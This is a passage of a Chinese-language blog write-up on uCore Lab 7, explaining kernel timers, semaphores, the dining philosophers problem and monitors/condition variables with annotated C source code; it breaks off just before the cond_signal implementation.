<p>线程间共享：同一个进程中的线程总是共享相同的内存地址空间</p>
</li>
<li>
<p>优点：快速、方便地共享数据</p>
</li>
<li>
<p>缺点：必须使用额外的同步机制来协调数据访问。</p>
</li>
<li>
<p>共享内存的系统调用</p>
<ul>
<li><code>shmget(key, size, flags)</code> : 创建共享段</li>
<li><code>shmat(shmid, *shmaddr, flags)</code> ：把共享段映射到进程地址空间</li>
<li><code>shmdt(*shmaddr)</code> : 取消共享段到进程地址空间的映射</li>
<li><code>shmctl(...)</code> ： 共享段控制</li>
<li>需要信号量等机制协调共享内存的访问冲突。</li>
</ul>
</li>
</ul>
<h2 id="练习解答">练习解答</h2>
<h3 id="练习0">练习0</h3>
<blockquote>
<p>填写已有实验。</p>
</blockquote>
<p>搜索一下<code>Lab7</code>关键词，只需要将原先lab6<code>kern/trap/trap.c</code>中</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> IRQ_OFFSET + IRQ_TIMER:</span><br><span class="line">        ticks++;</span><br><span class="line">        assert(current != <span class="literal">NULL</span>);</span><br><span class="line">        sched_class_proc_tick(current);</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>替换为以下代码即可。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> IRQ_OFFSET + IRQ_TIMER:</span><br><span class="line">        ticks ++;</span><br><span class="line">        assert(current != <span class="literal">NULL</span>);</span><br><span class="line">        run_timer_list(); <span class="comment">// 注意这里</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<h4 id="定时器timer">定时器timer</h4>
<ul>
<li>
<p><code>timer_t</code>结构用于存储一个定时器所需要的相关数据，包括<strong>倒计时时间</strong>以及<strong>所绑定的进程</strong>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> expires;       <span class="comment">//the expire time</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span>   <span class="comment">//the proc wait in this timer. If the expire time is end, then this proc will be scheduled</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> timer_link;    <span class="comment">//the timer list</span></span><br><span class="line">&#125; <span class="keyword">timer_t</span>;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>add_timer</code>用于将某个<code>timer</code>添加进timer列表中。</p>
<p>处于性能考虑，每个新添加的timer都会按照其<code>expires</code>属性的大小排列，同时减去上一个timer的<code>expires</code>属性。一个例子：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">两个尚未添加进列表中的timer:</span><br><span class="line">  timer1-&gt;expires = <span class="number">20</span>;</span><br><span class="line">  timer2-&gt;expires = <span class="number">38</span>;</span><br><span class="line">将这两个timer添加进列表后:（注意timer2的expires）</span><br><span class="line">  +------------+       +----------------------+       +--------------------------+</span><br><span class="line">  | timer_list | &lt;---&gt; | timer1-&gt;expires = <span class="number">20</span> | &lt;---&gt; | timer2-&gt;expires = <span class="number">18</span> !!! |</span><br><span class="line">  +------------+       +----------------------+       +--------------------------+</span><br></pre></td></tr></table></figure>
<p>这样，在更新timer_list中的所有timer的expires时，只需递减链首的<strong>第一个timer的expire</strong>，即可<strong>间接达到所有timer的expires减一的目的。</strong></p>
<p>该函数源代码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// add timer to timer_list</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_timer</span><span class="params">(<span class="keyword">timer_t</span> *timer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        assert(timer-&gt;expires &gt; <span class="number">0</span> &amp;&amp; timer-&gt;proc != <span class="literal">NULL</span>);</span><br><span class="line">        assert(list_empty(&amp;(timer-&gt;timer_link)));</span><br><span class="line">        <span class="keyword">list_entry_t</span> *le = list_next(&amp;timer_list);</span><br><span class="line">        <span class="comment">// 减去每个遍历到的timer的expires</span></span><br><span class="line">        <span class="keyword">while</span> (le != &amp;timer_list) &#123;</span><br><span class="line">            <span class="keyword">timer_t</span> *next = le2timer(le, timer_link);</span><br><span class="line">            <span class="keyword">if</span> (timer-&gt;expires &lt; next-&gt;expires) &#123;</span><br><span class="line">                next-&gt;expires -= timer-&gt;expires;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            timer-&gt;expires -= next-&gt;expires;</span><br><span class="line">            le = list_next(le);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将当前timer添加至列表中</span></span><br><span class="line">        list_add_before(le, &amp;(timer-&gt;timer_link));</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>run_timer_list</code>函数用于更新定时器的时间，并更新当前进程的运行时间片。如果当前定时器的剩余时间结束，则唤醒某个处于<code>WT_INTERRUPTED</code>等待状态的进程。有一点在上个函数中提到过：<strong>递减timer_list中每个timer的expires时，只递减链头第一个timer的expires</strong>。该函数的源代码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// call scheduler to update tick related info, and check the timer is  expired? If expired, then wakup proc</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run_timer_list</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">list_entry_t</span> *le = list_next(&amp;timer_list);</span><br><span class="line">        <span class="keyword">if</span> (le != &amp;timer_list) &#123;</span><br><span class="line">            <span class="keyword">timer_t</span> *timer = le2timer(le, timer_link);</span><br><span class="line">            assert(timer-&gt;expires != <span class="number">0</span>);</span><br><span class="line">            <span class="comment">// 只递减链头timer的expires</span></span><br><span class="line">            timer-&gt;expires --;</span><br><span class="line">            <span class="keyword">while</span> (timer-&gt;expires == <span class="number">0</span>) &#123;</span><br><span class="line">                le = list_next(le);</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span> = <span class="title">timer</span>-&gt;<span class="title">proc</span>;</span></span><br><span class="line">                <span class="keyword">if</span> (proc-&gt;wait_state != <span class="number">0</span>) &#123;</span><br><span class="line">                    assert(proc-&gt;wait_state &amp; WT_INTERRUPTED);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    warn(<span class="string">"process %d's wait_state == 0.\n"</span>, proc-&gt;pid);</span><br><span class="line">                &#125;</span><br><span class="line">                wakeup_proc(proc);</span><br><span class="line">                del_timer(timer);</span><br><span class="line">                <span class="keyword">if</span> (le == &amp;timer_list) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                timer = le2timer(le, timer_link);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sched_class_proc_tick(current);</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>将timer从timer_list中删除的操作比较简单：设置好<strong>当前待移除timer的下一个timer-&gt;expires</strong>，并<strong>将当前timer从链表中移除</strong>即可。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// del timer from timer_list</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del_timer</span><span class="params">(<span class="keyword">timer_t</span> *timer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!list_empty(&amp;(timer-&gt;timer_link))) &#123;</span><br><span class="line">            <span class="keyword">if</span> (timer-&gt;expires != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">list_entry_t</span> *le = list_next(&amp;(timer-&gt;timer_link));</span><br><span class="line">                <span class="keyword">if</span> (le != &amp;timer_list) &#123;</span><br><span class="line">                    <span class="keyword">timer_t</span> *next = le2timer(le, timer_link);</span><br><span class="line">                    next-&gt;expires += timer-&gt;expires;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            list_del_init(&amp;(timer-&gt;timer_link));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>一个简单的例子，<code>do_sleep</code>函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_sleep</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> time)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (time == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    <span class="comment">// 设置定时器</span></span><br><span class="line">    <span class="keyword">timer_t</span> __timer, *timer = timer_init(&amp;__timer, current, time);</span><br><span class="line">    current-&gt;state = PROC_SLEEPING;</span><br><span class="line">    current-&gt;wait_state = WT_TIMER;</span><br><span class="line">    <span class="comment">// 启用定时器</span></span><br><span class="line">    add_timer(timer);</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">    <span class="comment">// 当前进程放弃CPU资源</span></span><br><span class="line">    schedule();</span><br><span class="line">    <span class="comment">// 时间到点了，删除当前timer</span></span><br><span class="line">    del_timer(timer);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>定时器的用处：定时器可以帮助操作系统在<strong>经过一段特定时间</strong>后执行一些特殊操作，例如唤醒执行线程。可以说，<strong>正是有了定时器，操作系统才有了时间这个概念</strong>。</p>
</li>
</ul>
<h3 id="练习1">练习1</h3>
<blockquote>
<p>理解内核级信号量的实现和基于内核级信号量的哲学家就餐问题</p>
</blockquote>
<ul>
<li>
<p>哲学家就餐问题</p>
<ul>
<li>
<p>uCore中的哲学家就餐主要代码较为简单：每个哲学家拿起叉子，进食，然后放下叉子。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> state_sema[N]; <span class="comment">/* 记录每个人状态的数组 */</span></span><br><span class="line"><span class="comment">/* 信号量是一个特殊的整型变量 */</span></span><br><span class="line"><span class="keyword">semaphore_t</span> mutex; <span class="comment">/* 临界区互斥 */</span></span><br><span class="line"><span class="keyword">semaphore_t</span> s[N]; <span class="comment">/* 每个哲学家一个信号量 */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">philosopher_proc_sema</span>[<span class="title">N</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">philosopher_using_semaphore</span><span class="params">(<span class="keyword">void</span> * arg)</span> <span class="comment">/* i：哲学家号码，从0到N-1 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, iter=<span class="number">0</span>;</span><br><span class="line">    i=(<span class="keyword">int</span>)arg;</span><br><span class="line">    cprintf(<span class="string">"I am No.%d philosopher_sema\n"</span>,i);</span><br><span class="line">    <span class="keyword">while</span>(iter++&lt;TIMES)</span><br><span class="line">    &#123; <span class="comment">/* 无限循环 */</span></span><br><span class="line">        cprintf(<span class="string">"Iter %d, No.%d philosopher_sema is thinking\n"</span>,iter,i); <span class="comment">/* 哲学家正在思考 */</span></span><br><span class="line">        do_sleep(SLEEP_TIME);</span><br><span class="line">        phi_take_forks_sema(i);</span><br><span class="line">        <span class="comment">/* 需要两只叉子，或者阻塞 */</span></span><br><span class="line">        cprintf(<span class="string">"Iter %d, No.%d philosopher_sema is eating\n"</span>,iter,i); <span class="comment">/* 进餐 */</span></span><br><span class="line">        do_sleep(SLEEP_TIME);</span><br><span class="line">        phi_put_forks_sema(i);</span><br><span class="line">        <span class="comment">/* 把两把叉子同时放回桌子 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    cprintf(<span class="string">"No.%d philosopher_sema quit\n"</span>,i);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>拿起 / 放下叉子时，由于需要修改当前哲学家的状态，同时该状态是<strong>全局共享变量</strong>，所以需要获取锁来防止条件竞争。</p>
<p>将叉子放回桌上时，如果当前哲学家左右两边的两位哲学家处于<strong>饥饿状态</strong>，即准备进餐但没有刀叉时，如果条件符合，则唤醒这两位哲学家并让其继续进餐。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phi_take_forks_sema</span><span class="params">(<span class="keyword">int</span> i)</span> <span class="comment">/* i：哲学家号码从0到N-1 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        down(&amp;mutex); <span class="comment">/* 进入临界区 */</span></span><br><span class="line">        state_sema[i]=HUNGRY; <span class="comment">/* 记录下哲学家i饥饿的事实 */</span></span><br><span class="line">        phi_test_sema(i); <span class="comment">/* 试图得到两只叉子 */</span></span><br><span class="line">        up(&amp;mutex); <span class="comment">/* 离开临界区 */</span></span><br><span class="line">        down(&amp;s[i]); <span class="comment">/* 如果得不到叉子就阻塞 */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phi_put_forks_sema</span><span class="params">(<span class="keyword">int</span> i)</span> <span class="comment">/* i：哲学家号码从0到N-1 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        down(&amp;mutex); <span class="comment">/* 进入临界区 */</span></span><br><span class="line">        state_sema[i]=THINKING; <span class="comment">/* 哲学家进餐结束 */</span></span><br><span class="line">        phi_test_sema(LEFT); <span class="comment">/* 看一下左邻居现在是否能进餐 */</span></span><br><span class="line">        phi_test_sema(RIGHT); <span class="comment">/* 看一下右邻居现在是否能进餐 */</span></span><br><span class="line">        up(&amp;mutex); <span class="comment">/* 离开临界区 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>phi_test_sema</code>函数用于设置哲学家的进食状态。如果当前哲学家满足进食条件，则更新哲学家状态，执行哲学家锁所对应的V操作，以<strong>唤醒</strong>等待叉子的哲学家所对应的线程。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phi_test_sema</span><span class="params">(i)</span> <span class="comment">/* i：哲学家号码从0到N-1 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(state_sema[i]==HUNGRY&amp;&amp;state_sema[LEFT]!=EATING</span><br><span class="line">            &amp;&amp;state_sema[RIGHT]!=EATING)</span><br><span class="line">    &#123;</span><br><span class="line">        state_sema[i]=EATING;</span><br><span class="line">        up(&amp;s[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p>请给出内核级信号量的设计描述，并说明其大致执行流程</p>
<ul>
<li>
<p>内核中的信号量结构体如下，与操作系统理论课所实现的相差不大</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="keyword">wait_queue_t</span> wait_queue;</span><br><span class="line">&#125; <span class="keyword">semaphore_t</span>;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>进入临界区时，uCore会执行<code>down</code>函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">down(&amp;mutex); <span class="comment">/* 进入临界区 */</span></span><br></pre></td></tr></table></figure>
<p>与之相对的，退出临界区时会执行<code>up</code>函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">up(&amp;mutex); <span class="comment">/* 离开临界区 */</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>down</code>函数和<code>up</code>函数分别是<code>_down</code>和<code>_up</code>的wrapper。它们除了传入信号量以外，还会传入一个等待状态<code>wait_state</code>。</p>
</blockquote>
</li>
<li>
<p><code>_down</code>函数会递减当前信号量的<code>value</code>值。如果<code>value</code>在递减前为0，则将其加入至等待队列<code>wait_queue</code>中，并使当前线程<strong>立即放弃CPU资源</strong>，调度至其他线程。<strong>注意其中的原子操作</strong>。该函数的源码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> __noinline <span class="keyword">uint32_t</span> __down(<span class="keyword">semaphore_t</span> *sem, <span class="keyword">uint32_t</span> wait_state) &#123;</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    <span class="keyword">if</span> (sem-&gt;value &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// value值递减</span></span><br><span class="line">        sem-&gt;value --;</span><br><span class="line">        local_intr_restore(intr_flag);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果在上一步中，值已经为0了，则将当前进程添加进等待队列中</span></span><br><span class="line">    <span class="keyword">wait_t</span> __wait, *wait = &amp;__wait;</span><br><span class="line">    wait_current_set(&amp;(sem-&gt;wait_queue), wait, wait_state);</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">    <span class="comment">// 进程调度</span></span><br><span class="line">    schedule();</span><br><span class="line">    <span class="comment">// 从等待队列中删除当前进程</span></span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    wait_current_del(&amp;(sem-&gt;wait_queue), wait);</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (wait-&gt;wakeup_flags != wait_state) &#123;</span><br><span class="line">        <span class="keyword">return</span> wait-&gt;wakeup_flags;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>_up</code>函数实现的功能稍微简单一点：如果没有等待线程则<code>value++</code>，否则唤醒第一条等待线程。</p>
<blockquote>
<p>注意：<code>_up</code>函数如果选择唤醒第一条等待线程的话，则<code>value</code>不加一</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> __noinline <span class="keyword">void</span> __up(<span class="keyword">semaphore_t</span> *sem, <span class="keyword">uint32_t</span> wait_state) &#123;</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">wait_t</span> *wait;</span><br><span class="line">        <span class="comment">// 如果当前等待队列中没有线程等待，则value照常+1</span></span><br><span class="line">        <span class="keyword">if</span> ((wait = wait_queue_first(&amp;(sem-&gt;wait_queue))) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            sem-&gt;value ++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 否则如果当前等待队列中存在线程正在等待，则唤醒该线程并开始执行对应代码</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            assert(wait-&gt;proc-&gt;wait_state == wait_state);</span><br><span class="line">            wakeup_wait(&amp;(sem-&gt;wait_queue), wait, wait_state, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p>请给出给用户态进程/线程提供信号量机制的设计方案，并比较说明给内核级提供信号量机制的异同</p>
<ul>
<li>
<p>内核为用户态进程/线程提供信号量机制时，需要设计多个应用程序接口，而用户态线程只能通过这些内核提供的接口来使用内核服务。借鉴于Linux提供的标准接口，内核提供的这些接口可分别为：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*Initialize semaphore object SEM to VALUE.  If PSHARED then share it</span></span><br><span class="line"><span class="comment">   with other processes.  */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sem_init</span> <span class="params">(<span class="keyword">sem_t</span> *__sem, <span class="keyword">int</span> __pshared, <span class="keyword">unsigned</span> <span class="keyword">int</span> __value)</span></span>;</span><br><span class="line"><span class="comment">/* Free resources associated with semaphore object SEM.  */</span></span><br><span class="line"><span class="comment">// 将信号量所使用的资源全部释放</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sem_destroy</span> <span class="params">(<span class="keyword">sem_t</span> *__sem)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Open a named semaphore NAME with open flags OFLAG.  */</span></span><br><span class="line"><span class="comment">// 开启一个新信号量，并使用给定的flag来指定其标志</span></span><br><span class="line"><span class="function"><span class="keyword">sem_t</span> *<span class="title">sem_open</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *__name, <span class="keyword">int</span> __oflag, ...)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Close descriptor for named semaphore SEM.  */</span></span><br><span class="line"><span class="comment">// 将当前信号量所使用的描述符关闭</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sem_close</span> <span class="params">(<span class="keyword">sem_t</span> *__sem)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Remove named semaphore NAME.  */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sem_unlink</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *__name)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Wait for SEM being posted.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   This function is a cancellation point and therefore not marked with</span></span><br><span class="line"><span class="comment">   __THROW.  */</span></span><br><span class="line"><span class="comment">// 一个P操作，如果sem value &gt; 0，则sem value--；否则阻塞直到sem value &gt; 0</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sem_wait</span> <span class="params">(<span class="keyword">sem_t</span> *__sem)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Test whether SEM is posted.  */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sem_trywait</span> <span class="params">(<span class="keyword">sem_t</span> *__sem)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Post SEM.  */</span></span><br><span class="line"><span class="comment">// 一个V操作，把指定的信号量 sem 的值加 1，唤醒正在等待该信号量的任意线程。</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sem_post</span> <span class="params">(<span class="keyword">sem_t</span> *__sem)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Get current value of SEM and store it in *SVAL.  */</span></span><br><span class="line"><span class="comment">// 获取当前信号量的值</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sem_getvalue</span> <span class="params">(<span class="keyword">sem_t</span> *__restrict __sem, <span class="keyword">int</span> *__restrict __sval)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>相同点</p>
<ul>
<li>其核心的实现逻辑是一样的</li>
</ul>
</li>
<li>
<p>不同点</p>
<ul>
<li>内核态的信号量机制可以直接调用内核的服务，而用户态的则需要通过内核提供的接口来访问内核态服务，这其中涉及到了用户态转内核态的相关机制。</li>
<li>内核态的信号量存储于内核栈中；但用户态的信号量存储于用户栈中。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="练习2">练习2</h3>
<blockquote>
<p>总体任务：完成内核级条件变量和基于内核级条件变量的哲学家就餐问题</p>
</blockquote>
<blockquote>
<ol>
<li>基于信号量实现完成条件变量实现，给出内核级条件变量的设计描述，并说明其大致执行流程。</li>
</ol>
</blockquote>
<ul>
<li>
<p>管程由一个锁和多个条件变量组成，以下是管程和条件变量的结构体代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">monitor</span> <span class="title">monitor_t</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">condvar</span>&#123;</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> sem;        <span class="comment">// 条件变量所对应的信号量</span></span><br><span class="line">    <span class="keyword">int</span> count;              <span class="comment">// 等待当前条件变量的等待进程总数</span></span><br><span class="line">    <span class="keyword">monitor_t</span> * owner;      <span class="comment">// 当前条件变量的父管程</span></span><br><span class="line">&#125; <span class="keyword">condvar_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">monitor</span>&#123;</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> mutex;      <span class="comment">// 管程锁，每次只能有一个进程执行管程代码。该值初始化为1</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> next;       <span class="comment">// the next semaphore is used to down the signaling proc itself, and the other OR wakeuped waiting proc should wake up the sleeped signaling proc.</span></span><br><span class="line">    <span class="keyword">int</span> next_count;         <span class="comment">// the number of of sleeped signaling proc</span></span><br><span class="line">    <span class="keyword">condvar_t</span> *cv;          <span class="comment">// 当前管程中存放所有条件变量的数组</span></span><br><span class="line">&#125; <span class="keyword">monitor_t</span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：<code>monitor</code>结构中<code>next</code>信号量的功能请在下文结合<code>cond_signal</code>说明来理解。</p>
</blockquote>
</li>
<li>
<p>初始化管程时，函数<code>monitor_init</code>会初始化传入管程的相关成员变量，并为该管程设置多个条件变量并初始化。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Initialize monitor.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">monitor_init</span> <span class="params">(<span class="keyword">monitor_t</span> * mtp, <span class="keyword">size_t</span> num_cv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    assert(num_cv&gt;<span class="number">0</span>);</span><br><span class="line">    mtp-&gt;next_count = <span class="number">0</span>;</span><br><span class="line">    mtp-&gt;cv = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// 初始化管程锁为1</span></span><br><span class="line">    sem_init(&amp;(mtp-&gt;mutex), <span class="number">1</span>); <span class="comment">//unlocked</span></span><br><span class="line">    sem_init(&amp;(mtp-&gt;next), <span class="number">0</span>);<span class="comment">// 注意这里的0</span></span><br><span class="line">    <span class="comment">// 分配当前管程内的条件变量</span></span><br><span class="line">    mtp-&gt;cv =(<span class="keyword">condvar_t</span> *) kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">condvar_t</span>)*num_cv);</span><br><span class="line">    assert(mtp-&gt;cv!=<span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// 初始化管程内条件变量的各个属性</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;num_cv; i++)&#123;</span><br><span class="line">        mtp-&gt;cv[i].count=<span class="number">0</span>;</span><br><span class="line">        sem_init(&amp;(mtp-&gt;cv[i].sem),<span class="number">0</span>);</span><br><span class="line">        mtp-&gt;cv[i].owner=mtp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>当某个线程准备离开临界区、准备释放对应的条件变量时，线程会执行函数<code>cond_signal</code>。该函数同样是这次要实现的函数之一。</p>
<ul>
<li>
<p>如果<strong>不存在线程</strong>正在等待带释放的条件变量，则不执行任何操作</p>
</li>
<li>
<p>否则，对传入条件变量内置的信号执行V操作。注意：这一步可能会唤醒某个等待线程。</p>
</li>
<li>
<p><strong>关键的一步！</strong> 函数内部接下来会执行<code>down(&amp;(cvp-&gt;owner-&gt;next))</code>操作。由于<code>monitor::next</code>在初始化时就设置为<strong>0</strong>，所以当执行到该条代码时，无论如何，<strong>当前正在执行<code>cond_signal</code>函数的线程一定会被挂起</strong>。这也正是管程中<code>next</code>信号量的用途。</p>
<blockquote>
<p>为什么要做这一步呢？原因是<strong>保证管程代码的互斥访问</strong>。</p>
<p>一个简单的例子：线程1因等待条件变量a而挂起，过了一段时间，线程2释放条件变量a，此时线程1被唤醒，并等待调度。注意！<strong>此时在管程代码中，存在两个活跃线程</strong>（这里的活跃指的是正在运行/就绪线程），而这<strong>违背了管程的互斥性</strong>。因此，线程2在释放条件变量a后应当<strong>立即挂起</strong>以保证管程代码互斥。而<code>next</code>信号量便是帮助线程2立即挂起的一个信号。</p>
</blockquote>
</li>
</ul>
<p>以下是该函数的实现代码：</p>
